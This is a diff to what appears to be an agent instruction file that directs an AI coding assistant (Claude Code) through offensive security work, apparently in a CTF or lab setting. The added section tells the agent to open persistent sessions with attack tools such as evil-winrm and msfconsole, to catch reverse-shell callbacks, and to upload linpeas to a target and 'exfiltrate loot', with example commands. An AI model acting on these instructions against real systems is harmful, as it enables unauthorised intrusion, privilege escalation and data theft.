@@ -71,6 +71,39 @@ exploits, service abuse, DLL hijacking) spawn a new SYSTEM shell. Without
 the shell-server, there is no way to receive and interact with these shells —
 Claude Code's Bash tool runs each command as a separate process.
 
+## Interactive Processes via MCP
+
+Use `start_process` to spawn local interactive tools in a persistent PTY.
+This is for tools that need session persistence — credential-based access
+(evil-winrm, ssh), exploit frameworks (msfconsole), and tools that maintain
+state between commands.
+
+- `start_process(command="<tool>", label="<label>")` — spawn the process
+- `send_command(session_id=..., command=...)` — interact with it
+- `read_output(session_id=...)` — check for async output
+- `close_session(session_id=..., save_transcript=true)` — clean up
+
+**When to use which:**
+
+| Scenario | Tool |
+|----------|------|
+| Target sends reverse shell callback | `start_listener` |
+| Have credentials + service port open | `start_process` |
+| Exploit framework (msfconsole) | `start_process` |
+| Single non-interactive command | Bash |
+
+**Evil-WinRM for file transfer (preferred on Windows):** When WinRM is
+available (port 5985 or 5986), use evil-winrm's built-in `upload` and
+`download` commands for transferring tools and exfiltrating loot. This is more
+reliable than SMB or base64 encoding:
+
+```bash
+start_process(command="evil-winrm -i TARGET -u user -p 'Password123'")
+# Then via send_command:
+send_command(session_id=..., command="upload /path/to/linpeas.exe C:\\Windows\\Temp\\linpeas.exe")
+send_command(session_id=..., command="download C:\\Users\\admin\\Desktop\\flag.txt ./flag.txt")
+```
+
 ## Scope Boundaries — What You Must NOT Do
 
 - **Do not load a second skill.** When the loaded skill says "Route to
